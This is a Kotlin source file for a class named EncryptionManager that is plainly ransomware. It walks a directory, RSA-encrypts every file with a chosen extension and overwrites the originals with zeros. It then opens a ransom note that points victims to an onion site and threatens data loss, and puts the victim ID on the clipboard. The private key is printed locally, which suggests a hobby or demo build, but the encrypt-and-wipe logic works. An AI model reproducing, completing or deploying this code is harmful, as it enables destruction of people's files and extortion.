package briiqn.lol

import java.awt.Desktop
import java.awt.Toolkit
import java.awt.datatransfer.StringSelection
import java.io.*
import java.net.URI
import java.net.URL
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardOpenOption
import java.security.*
import java.util.*
import java.util.UUID.randomUUID
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec
import kotlin.io.path.ExperimentalPathApi
import kotlin.io.path.absolutePathString
import kotlin.io.path.walk
import java.security.Key
import java.security.KeyFactory
import java.security.PrivateKey
import java.security.spec.PKCS8EncodedKeySpec
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
/*
Reminders to self:
 -try  to encrypt each block using aes256
 - MAKE IO SPEED FASTRRRR!
 - Coroutines soon? (nope, too much bloat already)
 */
class EncryptionManager {
    private val MAX_ENCRYPT_BLOCK = 245
    private val MAX_DECRYPT_BLOCK = 256 //our decryption io speed is going to be so slow :(
    private val keyPair=generateKeyPair()
    private var encryptedData = CopyOnWriteArrayList<ByteArray>()
    private val threadPool: ExecutorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors())

    @OptIn(ExperimentalPathApi::class)
    fun encryptDirectory(dir: Path, suffix:String) {
        dir.walk().forEach { file -> if(file.toFile().extension==suffix){
           encryptedData.add(encryptContent(file.toFile()))
            val size=file.toFile().length()
            val zeros=ByteArray(size.toInt())
            println("SHA256 Hash of ${file.toFile().name}  : ${calchHash(file.toFile())}")
            Files.newOutputStream(file,StandardOpenOption.WRITE,StandardOpenOption.TRUNCATE_EXISTING).use { outputStream -> outputStream.write(zeros) }

        }}

        System.gc()
        val scanner = Scanner(System.`in`)
        println(Base64.getEncoder().encodeToString(keyPair.private.encoded))
Thread {
    val clipboard = Toolkit.getDefaultToolkit().systemClipboard
    val selection = StringSelection("xyz.onion/customerid=${Base64.getEncoder().encodeToString(keyPair.public.encoded)}")
    clipboard.setContents(selection, null)
       var ransomNote= "\n________________________________________________\n                 ATTENTION!!!  \n \n Your Computer Has Been Compromised By xyz!\n Any attempt of closing the infected application, shutting down the computer, memory analysis will immediately result in the loss of your data\n your files have been encrypted with military grade encryption\n to decrypt your files please install the Tor Browser from https://torproject.org & contact us at xyz.onion\n Once you navigate to our onion site enter the string of text below \n\n ${
            Base64.getEncoder().encodeToString(keyPair.public.encoded)}   \n \n (this is also in your clipboard along with the onion site) \n\n Total Files Encrypted:  ${encryptedData.size}" +
               "\n\n_______________________________________________"
       val tempFile = File.createTempFile("temp", ".txt")
       tempFile.writeText(ransomNote)

    if (Desktop.isDesktopSupported()) {

        Desktop.getDesktop().open(tempFile)
    }

}.start()
        println("Enter Decryption Key: ")
        val userInput = scanner.nextLine()
        val key=b64ToKey(userInput)
        for (data in encryptedData) {
            threadPool.submit {
                decryptContent(data, File(dir.absolutePathString() + "/${randomUUID()}.${suffix}"), key)
                encryptedData.remove(data)
            }
        }


        threadPool.awaitTermination(Long.MAX_VALUE,TimeUnit.MINUTES)
        threadPool.shutdown()

    }




    private fun encryptContent(file: File): ByteArray {
        println("Encrypting File ${file.name}")
        val cipher = Cipher.getInstance("RSA")
        cipher.init(Cipher.ENCRYPT_MODE, keyPair.public)

        val outputStream = ByteArrayOutputStream()
        val inputBuffer = ByteArray(MAX_ENCRYPT_BLOCK)

        try {
            FileInputStream(file).buffered().use { fileInputStream ->
                var bytesRead: Int
                while (fileInputStream.read(inputBuffer).also { bytesRead = it } != -1) {
                    val encryptedBlock = cipher.doFinal(inputBuffer, 0, bytesRead)
                    outputStream.write(encryptedBlock)
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }

        return outputStream.toByteArray()
    }

    fun decryptContent(encryptedData: ByteArray, outputFile: File, privateKey: PrivateKey): File {
        println("Decrypting File")
        val startTime=System.currentTimeMillis()
        val cipher = Cipher.getInstance("RSA")
        cipher.init(Cipher.DECRYPT_MODE, privateKey)

        // says Buffered Out Stream is supa fast!!!
        val outputStream = BufferedOutputStream(FileOutputStream(outputFile))
        outputStream.use { outputStream ->
            var offset = 0
            while (offset < encryptedData.size) {
                val length = minOf(MAX_DECRYPT_BLOCK, encryptedData.size - offset)
                val decryptedBlock = cipher.doFinal(encryptedData, offset, length)
                outputStream.write(decryptedBlock)
                offset += MAX_DECRYPT_BLOCK
                if(offset%5000==0) {
                    print("\r File ${outputFile.path}  has ${(encryptedData.size - offset)  / 1000} kB left to decrypt.  DO NOT TURN OFF THE COMPUTER ")
                }
            }
        }

        println("\n Decryption complete in ${System.currentTimeMillis()-startTime} ms. Decrypted file saved at ${outputFile.path}")
        return outputFile
    }


    fun calchHash(file:File): String {
        val messageDigest = MessageDigest.getInstance("SHA-256")
        val fileInputStream = FileInputStream(file)
        val bufferedInputStream = BufferedInputStream(fileInputStream)
        val digestInputStream = DigestInputStream(bufferedInputStream, messageDigest)

        while (digestInputStream.read() != -1) {}
        val bytes = messageDigest.digest()
        val stringBuilder = StringBuilder()
        for (byte in bytes) {
            stringBuilder.append(String.format("%02x", byte))
        }
        digestInputStream.close()
        bufferedInputStream.close()
        fileInputStream.close()
        return stringBuilder.toString()
    }
    private fun generateKeyPair(): KeyPair {
        val keyPairGenerator = KeyPairGenerator.getInstance("RSA")
        keyPairGenerator.initialize(2048) //4096 and above is too slow, thank you java
        return keyPairGenerator.generateKeyPair()
    }
    fun b64ToKey(encodedPrivateKey: String): PrivateKey {
        val decodedBytes: ByteArray = Base64.getDecoder().decode(encodedPrivateKey)
        val keySpec = PKCS8EncodedKeySpec(decodedBytes)
        val keyFactory = KeyFactory.getInstance("RSA")
        return keyFactory.generatePrivate(keySpec)
    }
}